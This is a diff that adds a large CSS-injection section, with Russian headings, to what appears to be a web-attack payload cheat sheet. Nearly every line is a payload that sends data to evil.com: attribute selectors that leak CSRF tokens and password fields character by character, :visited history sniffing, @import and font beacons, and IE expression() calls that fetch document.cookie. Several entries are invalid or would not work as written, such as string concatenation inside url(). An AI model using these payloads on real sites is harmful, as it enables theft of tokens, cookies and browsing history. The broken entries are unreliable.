@@ -888,7 +888,316 @@ navigator.bluetooth.requestLEScan({acceptAllAdvertisements: true})
 //  ### **File System Access API**
 window.showOpenFilePicker().then(handles => handles[0].getFile().then(f => alert(f.name)))
 
+//  CSS ИНЪЕКЦИИ 
+<link rel="stylesheet" href="https://evil.com/xss.css">
+<style>@import url('https://evil.com/xss.css');</style>
+<style>body { background: url('https://evil.com/steal?' + document.cookie); }</style>
+<style>input[value^="a"] { background: url('https://evil.com/steal?char=a'); }</style>
+<style>input[value^="b"] { background: url('https://evil.com/steal?char=b'); }</style>
+<style>input[value^="c"] { background: url('https://evil.com/steal?char=c'); }</style>
+<style>input[type=password] { background: url('https://evil.com/steal?field=password'); }</style>
+<style>#token { background: url('https://evil.com/steal?token=' + encodeURIComponent(getComputedStyle(document.getElementById('token')).textContent)); }</style>
+<style>@font-face { font-family: 'xss'; src: url('https://evil.com/steal?font'); }</style>
+<style>@keyframes xss { from { background: url('https://evil.com/steal?start'); } }</style>
+<style>div:hover { background: url('https://evil.com/steal?hover'); }</style>
+<style>@media print { body { background: url('https://evil.com/steal?print'); } }</style>
+<style>@import 'https://evil.com/steal?import';</style>
+<style>html { background: url('javascript:alert(1)'); }</style>
+<style>body { background: url('data:text/html,<script>alert(1)</script>'); }</style>
+<style>* { color: expression(alert(1)); }</style> // IE only
+<style>div { width: expression(alert(1)); }</style> // IE only
+<style>@media all and (min-width:0) { body { background: url('https://evil.com/steal?media'); } }</style>
+<style>@supports (display: flex) { body { background: url('https://evil.com/steal?supports'); } }</style>
+<style>@document url('https://target.com') { body { background: url('https://evil.com/steal?doc'); } }</style>
+<style>@page { size: 100px 100px; background: url('https://evil.com/steal?page'); }</style>
+<style>@viewport { width: 100px; background: url('https://evil.com/steal?viewport'); }</style>
+<style>@counter-style xss { system: cyclic; symbols: url('https://evil.com/steal?counter'); }</style>
+<style>@property --xss { syntax: '<color>'; inherits: false; initial-value: url('https://evil.com/steal?property'); }</style>
 
+/* 1. БАЗОВЫЕ ЗАПРОСЫ */
+background: url('https://evil.com/steal');
+background-image: url('https://evil.com/steal');
+background-color: url('https://evil.com/steal');
+list-style-image: url('https://evil.com/steal');
+cursor: url('https://evil.com/steal');
+src: url('https://evil.com/steal');
+@import 'https://evil.com/steal';
+@import url('https://evil.com/steal');
+
+/* 2. ЭКСФИЛЬТРАЦИЯ ЧЕРЕЗ СЕЛЕКТОРЫ */
+input[name="token"][value^="a"] { background: url('https://evil.com/?a'); }
+input[name="token"][value^="b"] { background: url('https://evil.com/?b'); }
+input[name="token"][value^="c"] { background: url('https://evil.com/?c'); }
+input[name="token"][value^="d"] { background: url('https://evil.com/?d'); }
+input[name="token"][value^="e"] { background: url('https://evil.com/?e'); }
+input[name="token"][value^="f"] { background: url('https://evil.com/?f'); }
+input[name="token"][value$="g"] { background: url('https://evil.com/?g'); }
+input[name="token"][value$="h"] { background: url('https://evil.com/?h'); }
+input[name="token"][value$="i"] { background: url('https://evil.com/?i'); }
+input[name="token"][value*="j"] { background: url('https://evil.com/?j'); }
+
+/* 3. АТАКИ НА АТРИБУТЫ */
+[data-secret="123"] { background: url('https://evil.com/?data=123'); }
+[id="token"] { background: url('https://evil.com/?id=token'); }
+[class="csrf"] { background: url('https://evil.com/?class=csrf'); }
+[type="password"] { background: url('https://evil.com/?type=password'); }
+[name="csrf"] { background: url('https://evil.com/?name=csrf'); }
+[href*="admin"] { background: url('https://evil.com/?href=admin'); }
+
+/* 4. ПОЗИЦИОННЫЕ СЕЛЕКТОРЫ */
+input:nth-child(1) { background: url('https://evil.com/?pos=1'); }
+input:nth-of-type(2) { background: url('https://evil.com/?pos=2'); }
+input:first-child { background: url('https://evil.com/?first'); }
+input:last-child { background: url('https://evil.com/?last'); }
+input:only-child { background: url('https://evil.com/?only'); }
+
+/* 5. ПСЕВДОКЛАССЫ СОСТОЯНИЯ */
+input:focus { background: url('https://evil.com/?focus'); }
+input:hover { background: url('https://evil.com/?hover'); }
+input:active { background: url('https://evil.com/?active'); }
+input:checked { background: url('https://evil.com/?checked'); }
+input:disabled { background: url('https://evil.com/?disabled'); }
+input:enabled { background: url('https://evil.com/?enabled'); }
+input:read-only { background: url('https://evil.com/?readonly'); }
+input:read-write { background: url('https://evil.com/?readwrite'); }
+input:required { background: url('https://evil.com/?required'); }
+input:optional { background: url('https://evil.com/?optional'); }
+input:valid { background: url('https://evil.com/?valid'); }
+input:invalid { background: url('https://evil.com/?invalid'); }
+input:in-range { background: url('https://evil.com/?inrange'); }
+input:out-of-range { background: url('https://evil.com/?outrange'); }
+input:placeholder-shown { background: url('https://evil.com/?placeholder'); }
+
+/* 6. СТРУКТУРНЫЕ ПСЕВДОКЛАССЫ */
+:root { background: url('https://evil.com/?root'); }
+:empty { background: url('https://evil.com/?empty'); }
+:target { background: url('https://evil.com/?target'); }
+:lang(en) { background: url('https://evil.com/?lang=en'); }
+:lang(ru) { background: url('https://evil.com/?lang=ru'); }
+:not(.safe) { background: url('https://evil.com/?notsafe'); }
+
+/* 7. МЕДИА-ЗАПРОСЫ */
+@media all { body { background: url('https://evil.com/?media=all'); } }
+@media print { body { background: url('https://evil.com/?print'); } }
+@media screen { body { background: url('https://evil.com/?screen'); } }
+@media speech { body { background: url('https://evil.com/?speech'); } }
+@media (min-width: 1024px) { body { background: url('https://evil.com/?width=1024'); } }
+@media (max-width: 768px) { body { background: url('https://evil.com/?width=768'); } }
+@media (min-height: 800px) { body { background: url('https://evil.com/?height=800'); } }
+@media (orientation: landscape) { body { background: url('https://evil.com/?landscape'); } }
+@media (orientation: portrait) { body { background: url('https://evil.com/?portrait'); } }
+@media (aspect-ratio: 16/9) { body { background: url('https://evil.com/?ratio=16:9'); } }
+@media (color) { body { background: url('https://evil.com/?color'); } }
+@media (monochrome) { body { background: url('https://evil.com/?monochrome'); } }
+@media (hover: hover) { body { background: url('https://evil.com/?hover=yes'); } }
+@media (hover: none) { body { background: url('https://evil.com/?hover=no'); } }
+@media (pointer: fine) { body { background: url('https://evil.com/?pointer=fine'); } }
+@media (pointer: coarse) { body { background: url('https://evil.com/?pointer=coarse'); } }
+@media (prefers-color-scheme: dark) { body { background: url('https://evil.com/?dark'); } }
+@media (prefers-color-scheme: light) { body { background: url('https://evil.com/?light'); } }
+@media (prefers-reduced-motion: reduce) { body { background: url('https://evil.com/?nomotion'); } }
+@media (display-mode: fullscreen) { body { background: url('https://evil.com/?fullscreen'); } }
+
+/* 8. ФОНТЫ И @FONT-FACE */
+@font-face {
+    font-family: 'xss';
+    src: url('https://evil.com/steal?font');
+    font-family: 'xss2';
+    src: url('data:font/woff,AA...');
+}
+
+@font-face {
+    font-family: 'xss3';
+    src: url('javascript:alert(1)');
+}
+
+/* 9. КЛЮЧЕВЫЕ КАДРЫ (ANIMATIONS) */
+@keyframes steal {
+    from { background: url('https://evil.com/?start'); }
+    to { background: url('https://evil.com/?end'); }
+}
+
+@keyframes xss {
+    0% { background: url('https://evil.com/?0'); }
+    25% { background: url('https://evil.com/?25'); }
+    50% { background: url('https://evil.com/?50'); }
+    75% { background: url('https://evil.com/?75'); }
+    100% { background: url('https://evil.com/?100'); }
+}
+
+div {
+    animation: steal 1s infinite;
+}
+
+/* 10. CSS КОУНТЕРЫ */
+body {
+    counter-reset: xss;
+    counter-increment: xss;
+    content: counter(xss, url('https://evil.com/?counter'));
+}
+
+/* 11. ПСЕВДОЭЛЕМЕНТЫ */
+::before { content: url('https://evil.com/?before'); }
+::after { content: url('https://evil.com/?after'); }
+::first-letter { background: url('https://evil.com/?firstletter'); }
+::first-line { background: url('https://evil.com/?firstline'); }
+::selection { background: url('https://evil.com/?selection'); }
+::backdrop { background: url('https://evil.com/?backdrop'); }
+::placeholder { background: url('https://evil.com/?placeholder2'); }
+::marker { background: url('https://evil.com/?marker'); }
+::spelling-error { background: url('https://evil.com/?spelling'); }
+::grammar-error { background: url('https://evil.com/?grammar'); }
+
+/* 12. @SUPPORTS */
+@supports (display: flex) { body { background: url('https://evil.com/?flex'); } }
+@supports (display: grid) { body { background: url('https://evil.com/?grid'); } }
+@supports (position: sticky) { body { background: url('https://evil.com/?sticky'); } }
+@supports (backdrop-filter: blur()) { body { background: url('https://evil.com/?backdropfilter'); } }
+@supports not (display: flex) { body { background: url('https://evil.com/?noflex'); } }
+
+/* 13. @DOCUMENT (Firefox только) */
+@-moz-document url-prefix('https://target.com') {
+    body { background: url('https://evil.com/?target'); }
+}
+
+@-moz-document domain('example.com') {
+    body { background: url('https://evil.com/?domain'); }
+}
+
+/* 14. @PAGE */
+@page :first { background: url('https://evil.com/?pagefirst'); }
+@page :left { background: url('https://evil.com/?pageleft'); }
+@page :right { background: url('https://evil.com/?pageright'); }
+
+/* 15. @VIEWPORT */
+@viewport { width: 100px; background: url('https://evil.com/?viewport'); }
+
+/* 16. @COUNTER-STYLE */
+@counter-style xss {
+    system: cyclic;
+    symbols: url('https://evil.com/?counterstyle');
+}
+
+/* 17. @PROPERTY */
+@property --xss {
+    syntax: '<color>';
+    inherits: false;
+    initial-value: url('https://evil.com/?property');
+}
+
+/* 18. CSS-ВЫРАЖЕНИЯ (IE only) */
+expression(alert(1))
+expression(eval('alert(1)'))
+expression(document.location='https://evil.com')
+expression(window.open('https://evil.com'))
+
+div {
+    width: expression(alert(1));
+    height: expression(eval('alert(1)'));
+    color: expression(document.cookie);
+    background: expression(fetch('https://evil.com/steal?c='+document.cookie));
+}
+
+/* 19. CSS-ПЕРЕМЕННЫЕ (CUSTOM PROPERTIES) */
+:root {
+    --xss: url('https://evil.com/steal');
+    --xss2: 'https://evil.com/steal';
+    --xss3: alert(1);
+}
+
+div {
+    background: var(--xss);
+    content: var(--xss2);
+    font-family: var(--xss3);
+}
+
+/* 20. АТАКИ НА ИСТОРИЮ */
+a:visited { background: url('https://evil.com/?visited'); }
+a[href*="google"]:visited { background: url('https://evil.com/?google'); }
+a[href*="facebook"]:visited { background: url('https://evil.com/?facebook'); }
+a[href*="youtube"]:visited { background: url('https://evil.com/?youtube'); }
+a[href*="twitter"]:visited { background: url('https://evil.com/?twitter'); }
+a[href*="instagram"]:visited { background: url('https://evil.com/?instagram'); }
+a[href*="github"]:visited { background: url('https://evil.com/?github'); }
+a[href*="stackoverflow"]:visited { background: url('https://evil.com/?stackoverflow'); }
+
+/* 21. ИНЛАЙН-СТИЛИ */
+<div style="background: url('https://evil.com/steal')">
+<div style="background-image: url('https://evil.com/steal')">
+<div style="background-color: url('https://evil.com/steal')">
+<div style="list-style-image: url('https://evil.com/steal')">
+<div style="cursor: url('https://evil.com/steal')">
+<div style="content: url('https://evil.com/steal')">
+<div style="src: url('https://evil.com/steal')">
+<div style="behavior: url('https://evil.com/steal')">
+<div style="filter: url('https://evil.com/steal')">
+<div style="mask: url('https://evil.com/steal')">
+
+/* 22. CSS-ФИЛЬТРЫ */
+filter: url('https://evil.com/steal');
+filter: url('javascript:alert(1)');
+backdrop-filter: url('https://evil.com/steal');
+
+/* 23. КЛИП-ПАТИ */
+clip-path: url('https://evil.com/steal');
+clip-path: url('javascript:alert(1)');
+mask-image: url('https://evil.com/steal');
+mask-image: url('javascript:alert(1)');
+
+/* 24. @IMPORT ВНУТРИ СТИЛЕЙ */
+<style>@import 'https://evil.com/steal';</style>
+<style>@import url('https://evil.com/steal');</style>
+<style>@import 'https://evil.com/steal' screen;</style>
+<style>@import 'https://evil.com/steal' print;</style>
+
+/* 25. CSS ВНУТРИ HTML */
+<style>body { background: url('https://evil.com/steal'); }</style>
+<style>@import 'https://evil.com/steal';</style>
+<link rel="stylesheet" href="https://evil.com/steal">
+<?xml-stylesheet href="https://evil.com/steal" type="text/css"?>
+<style>@import 'data:text/css,body{background:url("https://evil.com/steal")}';</style>
+<style>@import 'https://evil.com/steal.css';</style>
+<style>@import '//evil.com/steal.css';</style>
+
+/* 26. DATA:URL В CSS */
+background: url('data:image/svg+xml,<svg onload=alert(1)>');
+background: url('data:text/html,<script>alert(1)</script>');
+background: url('data:text/css,body{background:red}');
+src: url('data:font/woff,AA...');
+cursor: url('data:image/png,base64,...');
+
+/* 27. JAVASCRIPT: В CSS (не везде) */
+background: url('javascript:alert(1)');
+background-image: url('javascript:alert(1)');
+src: url('javascript:alert(1)');
+@import 'javascript:alert(1)';
+cursor: url('javascript:alert(1)');
+
+/* 28. SVG В CSS */
+background: url('data:image/svg+xml,<svg onload=alert(1)>');
+background: url('data:image/svg+xml,<svg><script>alert(1)</script></svg>');
+background: url('https://evil.com/xss.svg');
+mask: url('https://evil.com/xss.svg#mask');
+
+/* 29. CSS-СЧЁТЧИКИ ДЛЯ ЭКСФИЛЬТРАЦИИ */
+div::before {
+    counter-increment: xss;
+    content: counter(xss, url('https://evil.com/?count'));
+}
+
+/* 30. КОМБИНИРОВАННЫЕ АТАКИ */
+<style>
+    @import 'https://evil.com/steal.css';
+    @font-face { font-family: xss; src: url('https://evil.com/steal?font'); }
+    @keyframes steal { from { background: url('https://evil.com/steal?start'); } }
+    div { animation: steal 1s; }
+    input[name="csrf"][value^="a"] { background: url('https://evil.com/?a'); }
+    input[name="csrf"][value^="b"] { background: url('https://evil.com/?b'); }
+    @media (min-width: 1024px) { body { background: url('https://evil.com/?desktop'); } }
+    @media (max-width: 768px) { body { background: url('https://evil.com/?mobile'); } }
+    a:visited { background: url('https://evil.com/?visited'); }
+    expression(alert(1));
+</style>
 ```
 
 
